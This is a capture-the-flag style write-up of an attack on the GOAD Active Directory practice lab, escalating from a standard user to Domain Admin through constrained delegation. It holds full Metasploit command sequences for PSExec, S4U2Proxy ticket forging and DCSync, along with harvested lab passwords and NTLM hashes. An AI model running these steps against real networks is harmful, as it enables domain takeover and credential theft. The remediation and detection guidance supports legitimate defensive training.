# GOAD Lab: From Standard User to Domain Admin via Constrained Delegation

**Target:** NORTH.SEVENKINGDOMS.LOCAL (Game of Active Directory Lab)
**Date:** 2025-12-17
**Result:** Domain Admin Achieved via S4U2Proxy Constrained Delegation Attack

---

## Executive Summary

Starting from a standard domain user (`jon.snow`) on a workstation, I achieved full domain compromise of the NORTH domain through a chain of misconfigurations culminating in a constrained delegation attack. The critical vulnerability was that `jon.snow` had constrained delegation rights to the Domain Controller's CIFS service, allowing impersonation of Domain Admins.

---

## Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         ATTACK PATH DIAGRAM                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  [Initial Access]                                                        │
│       │                                                                  │
│       ▼                                                                  │
│  jon.snow @ CASTELBLACK (Standard User)                                 │
│       │                                                                  │
│       ▼ NETLOGON Script Enumeration                                     │
│  ┌────────────────────────────────────┐                                 │
│  │ Found: jeor.mormont / _L0ngCl@w_   │                                 │
│  │ Found: tywin.lannister / powerkingftw135 (encrypted)                 │
│  └────────────────────────────────────┘                                 │
│       │                                                                  │
│       ▼ PSExec with jeor.mormont (Local Admin on CASTELBLACK)           │
│  ┌────────────────────────────────────┐                                 │
│  │ NT AUTHORITY\SYSTEM @ CASTELBLACK  │                                 │
│  └────────────────────────────────────┘                                 │
│       │                                                                  │
│       ▼ Credential Dumping (Mimikatz/Kiwi)                              │
│  ┌────────────────────────────────────┐                                 │
│  │ robb.stark NTLM hash               │                                 │
│  │ sql_svc cleartext password         │                                 │
│  │ jon.snow NTLM hash                 │                                 │
│  └────────────────────────────────────┘                                 │
│       │                                                                  │
│       ▼ Kerberoasting + Offline Cracking                                │
│  ┌────────────────────────────────────┐                                 │
│  │ jon.snow / iknownothing (cracked)  │                                 │
│  └────────────────────────────────────┘                                 │
│       │                                                                  │
│       ▼ Constrained Delegation Discovery                                │
│  ┌────────────────────────────────────┐                                 │
│  │ jon.snow → CIFS/winterfell (DC!)   │                                 │
│  └────────────────────────────────────┘                                 │
│       │                                                                  │
│       ▼ S4U2Self + S4U2Proxy Attack                                     │
│  ┌────────────────────────────────────┐                                 │
│  │ Impersonate: eddard.stark (DA)     │                                 │
│  │ Service: CIFS/winterfell           │                                 │
│  └────────────────────────────────────┘                                 │
│       │                                                                  │
│       ▼ DCSync via Impersonated Ticket                                  │
│  ┌────────────────────────────────────┐                                 │
│  │ ALL DOMAIN HASHES EXTRACTED        │                                 │
│  │ Including krbtgt (Golden Ticket)   │                                 │
│  └────────────────────────────────────┘                                 │
│       │                                                                  │
│       ▼                                                                  │
│  [DOMAIN ADMIN ACHIEVED]                                                │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Phase 1: Initial Access & Situational Awareness

### Starting Point
- **Session:** Meterpreter as `NORTH\jon.snow` on CASTELBLACK (10.50.0.22)
- **User Privileges:** Standard domain user, member of "Night Watch" and "Stark" groups

### Domain Reconnaissance
```
Domain: NORTH.SEVENKINGDOMS.LOCAL
Forest Root: SEVENKINGDOMS.LOCAL (bidirectional trust)
Domain Controller: WINTERFELL (10.50.0.11)
Domain Admins: Administrator, eddard.stark
```

### Key Discovery - NETLOGON Scripts
Enumerated the NETLOGON share and found credentials in scripts:

**\\\\winterfell\\NETLOGON\\script.ps1:**
```powershell
$user = "NORTH\jeor.mormont"
$password = "_L0ngCl@w_"
```

**\\\\winterfell\\NETLOGON\\secret.ps1:**
```powershell
# Encrypted password that decrypted to: powerkingftw135
# For user: T.L. (identified as tywin.lannister in SEVENKINGDOMS domain)
```

---

## Phase 2: Privilege Escalation on CASTELBLACK

### Local Admin Access
Used the discovered `jeor.mormont` credentials with PSExec:

```
msf6> use exploit/windows/smb/psexec
msf6> set RHOSTS 10.50.0.22
msf6> set SMBUser jeor.mormont
msf6> set SMBPass _L0ngCl@w_
msf6> set SMBDomain NORTH
msf6> run

[+] Meterpreter session opened - NT AUTHORITY\SYSTEM
```

### Credential Harvesting
With SYSTEM privileges, dumped credentials from memory:

| User | Credential Type | Value |
|------|----------------|-------|
| jon.snow | NTLM | `b8d76e56e9dac90539aff05e3ccb1755` |
| robb.stark | NTLM | `831486ac7f26860c9e2f51ac91e1a07a` |
| sql_svc | Password | `YouWillNotKerboroast1ngMeeeeee` |
| CASTELBLACK$ | NTLM | `7d3771df8a6124a6701960155a3495b8` |

### Additional Discoveries
- **samwell.tarly** password found in AD description field: `Heartsbane`
- **robb.stark** DefaultPassword in LSA secrets: `sexywolfy`

---

## Phase 3: Kerberoasting

Identified Kerberoastable accounts with SPNs set:
- jon.snow
- sql_svc
- sansa.stark

Requested TGS ticket for jon.snow and cracked offline:
```
jon.snow : iknownothing
```

---

## Phase 4: The Critical Discovery - Constrained Delegation

Enumerated delegation settings in Active Directory:

```powershell
$searcher.Filter = '(msDS-AllowedToDelegateTo=*)'
```

**Results:**
```
jon.snow: CIFS/winterfell, CIFS/winterfell.north.sevenkingdoms.local
CASTELBLACK$: HTTP/winterfell, HTTP/winterfell.north.sevenkingdoms.local
```

**This is the attack path!** `jon.snow` has constrained delegation to the CIFS service on the Domain Controller. Combined with the cracked password, this enables an S4U2Proxy attack to impersonate any user (including Domain Admins) to the DC.

---

## Phase 5: S4U2Proxy Attack - Domain Admin

### The Attack Explained

**S4U2Self:** Request a service ticket for any user to ourselves (jon.snow)
**S4U2Proxy:** Forward that ticket to a service we're allowed to delegate to (CIFS/winterfell)

This allows us to impersonate Domain Admins to the DC's file service!

### Execution with Metasploit

**Step 1: Request impersonated TGS ticket**
```
msf6> use auxiliary/admin/kerberos/get_ticket
msf6> set ACTION GET_TGS
msf6> set RHOSTS 10.50.0.11
msf6> set DOMAIN north.sevenkingdoms.local
msf6> set USERNAME jon.snow
msf6> set PASSWORD iknownothing
msf6> set SPN CIFS/winterfell.north.sevenkingdoms.local
msf6> set IMPERSONATE eddard.stark
msf6> run

[+] Received a valid TGS-Response
[*] TGS MIT Credential Cache ticket saved to /home/user/.msf4/loot/...
```

**Step 2: Use ticket to dump secrets via DCSync**
```
msf6> use auxiliary/gather/windows_secrets_dump
msf6> set RHOSTS 10.50.0.11
msf6> set SMB::Auth kerberos
msf6> set SMB::Krb5Ccname /path/to/ticket.bin
msf6> set SMBUser eddard.stark
msf6> set SMBDomain NORTH.SEVENKINGDOMS.LOCAL
msf6> set SMB::Rhostname winterfell.north.sevenkingdoms.local
msf6> set DomainControllerRhost 10.50.0.11
msf6> set ACTION DOMAIN
msf6> run

[+] DCSync successful - All domain credentials extracted!
```

---

## Phase 6: Domain Dominance

### Extracted Domain Credentials

**Domain Admins:**
| Account | NTLM Hash |
|---------|-----------|
| Administrator | `dbd13e1c4e338284ac4e9874f7de6ef4` |
| eddard.stark | `d977b98c6c9282c5c478be1d97b237b8` |

**Golden Ticket Material:**
| Account | NTLM Hash |
|---------|-----------|
| krbtgt | `e3e8bc543cc3da2285e6a0a4a2934d08` |

**All Domain Users:**
| Account | NTLM Hash |
|---------|-----------|
| arya.stark | `4f622f4cd4284a887228940e2ff4e709` |
| catelyn.stark | `cba36eccfd9d949c73bc73715364aff5` |
| robb.stark | `831486ac7f26860c9e2f51ac91e1a07a` |
| sansa.stark | `b777555c2e2e3716e075cc255b26c14d` |
| brandon.stark | `84bbaa1c58b7f69d2192560a3f932129` |
| rickon.stark | `7978dc8a66d8e480d9a86041f8409560` |
| hodor | `337d2667505c203904bd899c6c95525e` |
| jon.snow | `b8d76e56e9dac90539aff05e3ccb1755` |
| samwell.tarly | `f5db9e027ef824d029262068ac826843` |
| jeor.mormont | `6dccf1c567c56a40e56691a723a49664` |
| sql_svc | `84a5092f53390ea48d660be52b93b804` |

**Machine Accounts:**
| Account | NTLM Hash |
|---------|-----------|
| WINTERFELL$ | `63b06bc824052112adbb298f3bf0151e` |
| CASTELBLACK$ | `7d3771df8a6124a6701960155a3495b8` |
| SEVENKINGDOMS$ | `5106a62498826d22affa33b584383e6f` |

---

## Credentials Summary

| Username | Password/Hash | Source |
|----------|---------------|--------|
| jeor.mormont | `_L0ngCl@w_` | NETLOGON script |
| tywin.lannister | `powerkingftw135` | NETLOGON encrypted secret |
| jon.snow | `iknownothing` | Kerberoasting + cracking |
| sql_svc | `YouWillNotKerboroast1ngMeeeeee` | LSASS dump |
| samwell.tarly | `Heartsbane` | AD description field |
| robb.stark | `sexywolfy` | LSA DefaultPassword |

---

## Vulnerabilities Exploited

### 1. Credentials in NETLOGON Scripts (Critical)
- **Issue:** Plaintext and weakly encrypted passwords in login scripts
- **Impact:** Initial foothold escalation
- **Remediation:** Never store credentials in scripts; use Group Managed Service Accounts (gMSA)

### 2. Weak Kerberos Passwords (High)
- **Issue:** jon.snow's password was easily crackable
- **Impact:** Enabled the constrained delegation attack
- **Remediation:** Enforce strong passwords for accounts with SPNs

### 3. Dangerous Constrained Delegation (Critical)
- **Issue:** Standard user (jon.snow) has delegation rights to DC's CIFS service
- **Impact:** Full domain compromise via S4U2Proxy
- **Remediation:**
  - Audit delegation settings: `Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'}`
  - Remove unnecessary delegation
  - Use "Account is sensitive and cannot be delegated" for privileged accounts
  - Consider Resource-Based Constrained Delegation with tighter controls

### 4. Password in AD Description Field (Medium)
- **Issue:** samwell.tarly's password stored in description
- **Impact:** Credential exposure
- **Remediation:** Never store sensitive data in AD attributes; audit regularly

### 5. LSA DefaultPassword (Medium)
- **Issue:** Auto-logon configured with stored password
- **Impact:** Credential exposure from LSA secrets
- **Remediation:** Disable auto-logon or use Windows Hello

---

## Tools Used

- **Metasploit Framework** - Session management, exploitation, credential dumping
- **Mimikatz/Kiwi** - Credential extraction from LSASS
- **Kerberos modules** - S4U2Proxy attack, ticket manipulation
- **PowerShell** - AD enumeration

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 |
| Credential Access | Kerberoasting | T1558.003 |
| Credential Access | DCSync | T1003.006 |
| Credential Access | Credentials in Files | T1552.001 |
| Privilege Escalation | Exploitation of Constrained Delegation | T1134.001 |
| Lateral Movement | Pass the Ticket | T1550.003 |
| Discovery | Account Discovery | T1087 |
| Discovery | Permission Groups Discovery | T1069 |

---

## Lessons Learned

1. **Constrained delegation is dangerous** - Even when scoped to specific services, it can lead to domain compromise when combined with S4U2Proxy

2. **Kerberoasting + Delegation = Game Over** - If an account is both Kerberoastable AND has delegation rights, cracking the password gives you impersonation capabilities

3. **NETLOGON is a goldmine** - Always enumerate NETLOGON and SYSVOL for credentials

4. **Defense in depth matters** - Multiple misconfigurations chained together led to full compromise

---

## Recommendations

1. **Audit Delegation Settings Monthly**
   ```powershell
   Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo
   ```

2. **Protect Privileged Accounts**
   - Mark as "Account is sensitive and cannot be delegated"
   - Add to Protected Users group

3. **Remove SPNs from Standard Users**
   - Only service accounts should have SPNs
   - Use gMSA where possible

4. **Implement Tiered Administration**
   - Separate admin accounts for different tiers
   - Don't allow Tier 0 credentials on lower-tier systems

5. **Monitor for S4U Abuse**
   - Event ID 4769 with ticket options indicating S4U
   - Unusual service ticket requests

---

*Report generated from Metasploit MCP engagement tracking*
